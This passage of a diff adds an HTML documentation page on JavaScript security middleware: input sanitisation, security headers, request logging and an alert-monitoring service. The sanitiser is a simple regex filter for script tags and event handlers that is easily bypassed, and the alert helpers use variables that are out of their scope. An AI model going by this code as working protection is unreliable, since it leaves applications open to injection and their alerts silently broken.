+    <span class="k">return</span> <span class="nx">obj</span><span class="p">;</span>
+  <span class="p">}</span>
+  
+  <span class="kd">const</span> <span class="nx">sanitized</span> <span class="o">=</span> <span class="p">{};</span>
+  
+  <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="p">[</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">]</span> <span class="k">of</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">obj</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">sanitized</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sanitizeString</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">object</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">sanitized</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sanitizeObject</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">sanitized</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  
+  <span class="k">return</span> <span class="nx">sanitized</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="c1">// Sanitize string</span>
+<span class="kd">const</span> <span class="nx">sanitizeString</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">str</span>
+    <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;script.*</span><span class="se">?</span><span class="sr">&gt;.*</span><span class="se">?</span><span class="sr">&lt;</span><span class="se">\/</span><span class="sr">script&gt;/gi</span><span class="p">,</span> <span class="dl">''</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/javascript:/gi</span><span class="p">,</span> <span class="dl">''</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/on</span><span class="se">\w</span><span class="sr">+</span><span class="se">\s</span><span class="sr">*=/gi</span><span class="p">,</span> <span class="dl">''</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">trim</span><span class="p">();</span>
+<span class="p">};</span>
+
+<span class="c1">// Add security headers</span>
+<span class="kd">const</span> <span class="nx">addSecurityHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">response</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">X-Content-Type-Options</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">nosniff</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">response</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">X-Frame-Options</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">DENY</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">response</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">X-XSS-Protection</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">1; mode=block</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">response</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Strict-Transport-Security</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">max-age=31536000; includeSubDomains</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">response</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Security-Policy</span><span class="dl">'</span><span class="p">,</span> <span class="dl">"</span><span class="s2">default-src 'self'</span><span class="dl">"</span><span class="p">);</span>
+  <span class="nx">response</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Referrer-Policy</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">strict-origin-when-cross-origin</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">};</span>
+
+<span class="c1">// Sanitize response data</span>
+<span class="kd">const</span> <span class="nx">sanitizeResponseData</span> <span class="o">=</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">response</span><span class="p">.</span><span class="nx">data</span> <span class="o">=</span> <span class="nx">sanitizeObject</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="c1">// Log security event</span>
+<span class="kd">const</span> <span class="nx">logSecurityEvent</span> <span class="o">=</span> <span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">event</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">timestamp</span><span class="p">:</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">(),</span>
+    <span class="na">ip</span><span class="p">:</span> <span class="nx">request</span><span class="p">.</span><span class="nx">ip</span><span class="p">,</span>
+    <span class="na">userAgent</span><span class="p">:</span> <span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">user-agent</span><span class="dl">'</span><span class="p">],</span>
+    <span class="na">method</span><span class="p">:</span> <span class="nx">request</span><span class="p">.</span><span class="nx">method</span><span class="p">,</span>
+    <span class="na">url</span><span class="p">:</span> <span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span>
+    <span class="na">statusCode</span><span class="p">:</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span><span class="p">,</span>
+    <span class="na">requestId</span><span class="p">:</span> <span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">x-request-id</span><span class="dl">'</span><span class="p">],</span>
+  <span class="p">};</span>
+  
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Security Event:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">event</span><span class="p">));</span>
+<span class="p">};</span>
+
+<span class="c1">// Export security middleware functions</span>
+<span class="k">export</span> <span class="p">{</span>
+  <span class="nx">createSecurityMiddleware</span><span class="p">,</span>
+  <span class="nx">validateRequestHeaders</span><span class="p">,</span>
+  <span class="nx">checkRateLimit</span><span class="p">,</span>
+  <span class="nx">validateRequestSignature</span><span class="p">,</span>
+  <span class="nx">sanitizeRequestData</span><span class="p">,</span>
+  <span class="nx">sanitizeObject</span><span class="p">,</span>
+  <span class="nx">sanitizeString</span><span class="p">,</span>
+  <span class="nx">addSecurityHeaders</span><span class="p">,</span>
+  <span class="nx">sanitizeResponseData</span><span class="p">,</span>
+  <span class="nx">logSecurityEvent</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-security-monitoring">📊 <strong>Security Monitoring</strong></h2>
+
+<h3 id="security-event-monitoring"><strong>Security Event Monitoring</strong></h3>
+
+<p><button onclick="copyCode(this)" class="copy-btn">📋 Copy</button></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Security monitoring service</span>
+<span class="kd">const</span> <span class="nx">createSecurityMonitoringService</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">securityEvents</span> <span class="o">=</span> <span class="p">[];</span>
+  <span class="kd">let</span> <span class="nx">alertThresholds</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">failedLogins</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span>
+    <span class="na">suspiciousRequests</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
+    <span class="na">dataAccess</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span>
+    <span class="na">errorRate</span><span class="p">:</span> <span class="mf">0.1</span><span class="p">,</span>
+  <span class="p">};</span>
+  
+  <span class="k">return</span> <span class="p">{</span>
+    <span class="c1">// Log security event</span>
+    <span class="na">logEvent</span><span class="p">:</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">securityEvent</span> <span class="o">=</span> <span class="p">{</span>
+          <span class="na">id</span><span class="p">:</span> <span class="nx">generateEventId</span><span class="p">(),</span>
+          <span class="na">timestamp</span><span class="p">:</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">(),</span>
+          <span class="na">type</span><span class="p">:</span> <span class="nx">event</span><span class="p">.</span><span class="nx">type</span><span class="p">,</span>
+          <span class="na">severity</span><span class="p">:</span> <span class="nx">event</span><span class="p">.</span><span class="nx">severity</span> <span class="o">||</span> <span class="dl">'</span><span class="s1">medium</span><span class="dl">'</span><span class="p">,</span>
+          <span class="na">source</span><span class="p">:</span> <span class="nx">event</span><span class="p">.</span><span class="nx">source</span> <span class="o">||</span> <span class="dl">'</span><span class="s1">unknown</span><span class="dl">'</span><span class="p">,</span>
+          <span class="na">details</span><span class="p">:</span> <span class="nx">event</span><span class="p">.</span><span class="nx">details</span><span class="p">,</span>
+          <span class="na">metadata</span><span class="p">:</span> <span class="nx">event</span><span class="p">.</span><span class="nx">metadata</span> <span class="o">||</span> <span class="p">{},</span>
+        <span class="p">};</span>
+        
+        <span class="nx">securityEvents</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">securityEvent</span><span class="p">);</span>
+        
+        <span class="c1">// Check for alerts</span>
+        <span class="nx">checkForAlerts</span><span class="p">(</span><span class="nx">securityEvent</span><span class="p">);</span>
+        
+        <span class="c1">// Store event</span>
+        <span class="nx">storeSecurityEvent</span><span class="p">(</span><span class="nx">securityEvent</span><span class="p">);</span>
+        
+        <span class="k">return</span> <span class="nx">securityEvent</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error logging security event:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+        <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Get security events</span>
+    <span class="na">getEvents</span><span class="p">:</span> <span class="p">(</span><span class="nx">filter</span> <span class="o">=</span> <span class="p">{})</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="kd">let</span> <span class="nx">filteredEvents</span> <span class="o">=</span> <span class="p">[...</span><span class="nx">securityEvents</span><span class="p">];</span>
+      
+      <span class="k">if</span> <span class="p">(</span><span class="nx">filter</span><span class="p">.</span><span class="nx">type</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">filteredEvents</span> <span class="o">=</span> <span class="nx">filteredEvents</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">event</span> <span class="o">=&gt;</span> <span class="nx">event</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="nx">filter</span><span class="p">.</span><span class="nx">type</span><span class="p">);</span>
+      <span class="p">}</span>
+      
+      <span class="k">if</span> <span class="p">(</span><span class="nx">filter</span><span class="p">.</span><span class="nx">severity</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">filteredEvents</span> <span class="o">=</span> <span class="nx">filteredEvents</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">event</span> <span class="o">=&gt;</span> <span class="nx">event</span><span class="p">.</span><span class="nx">severity</span> <span class="o">===</span> <span class="nx">filter</span><span class="p">.</span><span class="nx">severity</span><span class="p">);</span>
+      <span class="p">}</span>
+      
+      <span class="k">if</span> <span class="p">(</span><span class="nx">filter</span><span class="p">.</span><span class="nx">startTime</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">filteredEvents</span> <span class="o">=</span> <span class="nx">filteredEvents</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">event</span> <span class="o">=&gt;</span> 
+          <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">filter</span><span class="p">.</span><span class="nx">startTime</span><span class="p">)</span>
+        <span class="p">);</span>
+      <span class="p">}</span>
+      
+      <span class="k">if</span> <span class="p">(</span><span class="nx">filter</span><span class="p">.</span><span class="nx">endTime</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">filteredEvents</span> <span class="o">=</span> <span class="nx">filteredEvents</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">event</span> <span class="o">=&gt;</span> 
+          <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">filter</span><span class="p">.</span><span class="nx">endTime</span><span class="p">)</span>
+        <span class="p">);</span>
+      <span class="p">}</span>
+      
+      <span class="k">return</span> <span class="nx">filteredEvents</span><span class="p">.</span><span class="nx">sort</span><span class="p">((</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="o">=&gt;</span> 
+        <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">)</span> <span class="o">-</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">)</span>
+      <span class="p">);</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Get security metrics</span>
+    <span class="na">getMetrics</span><span class="p">:</span> <span class="p">(</span><span class="nx">timeRange</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">24h</span><span class="dl">'</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">now</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
+      <span class="kd">const</span> <span class="nx">startTime</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">now</span><span class="p">.</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">-</span> <span class="nx">getTimeRangeMs</span><span class="p">(</span><span class="nx">timeRange</span><span class="p">));</span>
+      
+      <span class="kd">const</span> <span class="nx">eventsInRange</span> <span class="o">=</span> <span class="nx">securityEvents</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">event</span> <span class="o">=&gt;</span> 
+        <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="nx">startTime</span>
+      <span class="p">);</span>
+      
+      <span class="kd">const</span> <span class="nx">metrics</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="na">totalEvents</span><span class="p">:</span> <span class="nx">eventsInRange</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+        <span class="na">eventsByType</span><span class="p">:</span> <span class="p">{},</span>
+        <span class="na">eventsBySeverity</span><span class="p">:</span> <span class="p">{},</span>
+        <span class="na">eventsBySource</span><span class="p">:</span> <span class="p">{},</span>
+        <span class="na">topSources</span><span class="p">:</span> <span class="p">[],</span>
+        <span class="na">topTypes</span><span class="p">:</span> <span class="p">[],</span>
+      <span class="p">};</span>
+      
+      <span class="c1">// Calculate metrics</span>
+      <span class="nx">eventsInRange</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">event</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="c1">// Events by type</span>
+        <span class="nx">metrics</span><span class="p">.</span><span class="nx">eventsByType</span><span class="p">[</span><span class="nx">event</span><span class="p">.</span><span class="nx">type</span><span class="p">]</span> <span class="o">=</span> 
+          <span class="p">(</span><span class="nx">metrics</span><span class="p">.</span><span class="nx">eventsByType</span><span class="p">[</span><span class="nx">event</span><span class="p">.</span><span class="nx">type</span><span class="p">]</span> <span class="o">||</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        
+        <span class="c1">// Events by severity</span>
+        <span class="nx">metrics</span><span class="p">.</span><span class="nx">eventsBySeverity</span><span class="p">[</span><span class="nx">event</span><span class="p">.</span><span class="nx">severity</span><span class="p">]</span> <span class="o">=</span> 
+          <span class="p">(</span><span class="nx">metrics</span><span class="p">.</span><span class="nx">eventsBySeverity</span><span class="p">[</span><span class="nx">event</span><span class="p">.</span><span class="nx">severity</span><span class="p">]</span> <span class="o">||</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        
+        <span class="c1">// Events by source</span>
+        <span class="nx">metrics</span><span class="p">.</span><span class="nx">eventsBySource</span><span class="p">[</span><span class="nx">event</span><span class="p">.</span><span class="nx">source</span><span class="p">]</span> <span class="o">=</span> 
+          <span class="p">(</span><span class="nx">metrics</span><span class="p">.</span><span class="nx">eventsBySource</span><span class="p">[</span><span class="nx">event</span><span class="p">.</span><span class="nx">source</span><span class="p">]</span> <span class="o">||</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">});</span>
+      
+      <span class="c1">// Get top sources</span>
+      <span class="nx">metrics</span><span class="p">.</span><span class="nx">topSources</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">metrics</span><span class="p">.</span><span class="nx">eventsBySource</span><span class="p">)</span>
+        <span class="p">.</span><span class="nx">sort</span><span class="p">(([,</span><span class="nx">a</span><span class="p">],</span> <span class="p">[,</span><span class="nx">b</span><span class="p">])</span> <span class="o">=&gt;</span> <span class="nx">b</span> <span class="o">-</span> <span class="nx">a</span><span class="p">)</span>
+        <span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
+        <span class="p">.</span><span class="nx">map</span><span class="p">(([</span><span class="nx">source</span><span class="p">,</span> <span class="nx">count</span><span class="p">])</span> <span class="o">=&gt;</span> <span class="p">({</span> <span class="nx">source</span><span class="p">,</span> <span class="nx">count</span> <span class="p">}));</span>
+      
+      <span class="c1">// Get top types</span>
+      <span class="nx">metrics</span><span class="p">.</span><span class="nx">topTypes</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">metrics</span><span class="p">.</span><span class="nx">eventsByType</span><span class="p">)</span>
+        <span class="p">.</span><span class="nx">sort</span><span class="p">(([,</span><span class="nx">a</span><span class="p">],</span> <span class="p">[,</span><span class="nx">b</span><span class="p">])</span> <span class="o">=&gt;</span> <span class="nx">b</span> <span class="o">-</span> <span class="nx">a</span><span class="p">)</span>
+        <span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
+        <span class="p">.</span><span class="nx">map</span><span class="p">(([</span><span class="nx">type</span><span class="p">,</span> <span class="nx">count</span><span class="p">])</span> <span class="o">=&gt;</span> <span class="p">({</span> <span class="nx">type</span><span class="p">,</span> <span class="nx">count</span> <span class="p">}));</span>
+      
+      <span class="k">return</span> <span class="nx">metrics</span><span class="p">;</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Set alert thresholds</span>
+    <span class="na">setAlertThresholds</span><span class="p">:</span> <span class="p">(</span><span class="nx">thresholds</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nx">alertThresholds</span> <span class="o">=</span> <span class="p">{</span> <span class="p">...</span><span class="nx">alertThresholds</span><span class="p">,</span> <span class="p">...</span><span class="nx">thresholds</span> <span class="p">};</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Get alert thresholds</span>
+    <span class="na">getAlertThresholds</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">alertThresholds</span><span class="p">,</span>
+  <span class="p">};</span>
+<span class="p">};</span>
+
+<span class="c1">// Check for alerts</span>
+<span class="kd">const</span> <span class="nx">checkForAlerts</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="c1">// Check failed login attempts</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">failed_login</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">recentFailedLogins</span> <span class="o">=</span> <span class="nx">getRecentEvents</span><span class="p">(</span><span class="dl">'</span><span class="s1">failed_login</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">1h</span><span class="dl">'</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">recentFailedLogins</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;=</span> <span class="nx">alertThresholds</span><span class="p">.</span><span class="nx">failedLogins</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">triggerAlert</span><span class="p">(</span><span class="dl">'</span><span class="s1">high</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Multiple failed login attempts detected</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
+          <span class="na">eventCount</span><span class="p">:</span> <span class="nx">recentFailedLogins</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+          <span class="na">timeRange</span><span class="p">:</span> <span class="dl">'</span><span class="s1">1h</span><span class="dl">'</span><span class="p">,</span>
+        <span class="p">});</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// Check suspicious requests</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">suspicious_request</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">recentSuspiciousRequests</span> <span class="o">=</span> <span class="nx">getRecentEvents</span><span class="p">(</span><span class="dl">'</span><span class="s1">suspicious_request</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">1h</span><span class="dl">'</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">recentSuspiciousRequests</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;=</span> <span class="nx">alertThresholds</span><span class="p">.</span><span class="nx">suspiciousRequests</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">triggerAlert</span><span class="p">(</span><span class="dl">'</span><span class="s1">medium</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Multiple suspicious requests detected</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
+          <span class="na">eventCount</span><span class="p">:</span> <span class="nx">recentSuspiciousRequests</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+          <span class="na">timeRange</span><span class="p">:</span> <span class="dl">'</span><span class="s1">1h</span><span class="dl">'</span><span class="p">,</span>
+        <span class="p">});</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// Check data access</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">data_access</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">recentDataAccess</span> <span class="o">=</span> <span class="nx">getRecentEvents</span><span class="p">(</span><span class="dl">'</span><span class="s1">data_access</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">1h</span><span class="dl">'</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">recentDataAccess</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;=</span> <span class="nx">alertThresholds</span><span class="p">.</span><span class="nx">dataAccess</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">triggerAlert</span><span class="p">(</span><span class="dl">'</span><span class="s1">low</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">High data access volume detected</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
+          <span class="na">eventCount</span><span class="p">:</span> <span class="nx">recentDataAccess</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+          <span class="na">timeRange</span><span class="p">:</span> <span class="dl">'</span><span class="s1">1h</span><span class="dl">'</span><span class="p">,</span>
+        <span class="p">});</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error checking for alerts:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="c1">// Get recent events</span>
+<span class="kd">const</span> <span class="nx">getRecentEvents</span> <span class="o">=</span> <span class="p">(</span><span class="nx">type</span><span class="p">,</span> <span class="nx">timeRange</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">now</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
+  <span class="kd">const</span> <span class="nx">startTime</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">now</span><span class="p">.</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">-</span> <span class="nx">getTimeRangeMs</span><span class="p">(</span><span class="nx">timeRange</span><span class="p">));</span>
+  
+  <span class="k">return</span> <span class="nx">securityEvents</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">event</span> <span class="o">=&gt;</span> 
+    <span class="nx">event</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="nx">type</span> <span class="o">&amp;&amp;</span> 
+    <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="nx">startTime</span>
+  <span class="p">);</span>
+<span class="p">};</span>
+
+<span class="c1">// Trigger alert</span>
+<span class="kd">const</span> <span class="nx">triggerAlert</span> <span class="o">=</span> <span class="p">(</span><span class="nx">severity</span><span class="p">,</span> <span class="nx">message</span><span class="p">,</span> <span class="nx">details</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">alert</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">id</span><span class="p">:</span> <span class="nx">generateEventId</span><span class="p">(),</span>
+    <span class="na">timestamp</span><span class="p">:</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">(),</span>
+    <span class="nx">severity</span><span class="p">,</span>
+    <span class="nx">message</span><span class="p">,</span>
+    <span class="nx">details</span><span class="p">,</span>
+    <span class="na">status</span><span class="p">:</span> <span class="dl">'</span><span class="s1">active</span><span class="dl">'</span><span class="p">,</span>
+  <span class="p">};</span>
+  
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Security Alert:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">alert</span><span class="p">));</span>
+  
+  <span class="c1">// In a real implementation, you would send alerts via email, SMS, etc.</span>
+  <span class="c1">// For now, we'll just log it</span>
+<span class="p">};</span>
+
+<span class="c1">// Generate event ID</span>
+<span class="kd">const</span> <span class="nx">generateEventId</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">)</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="p">};</span>
+
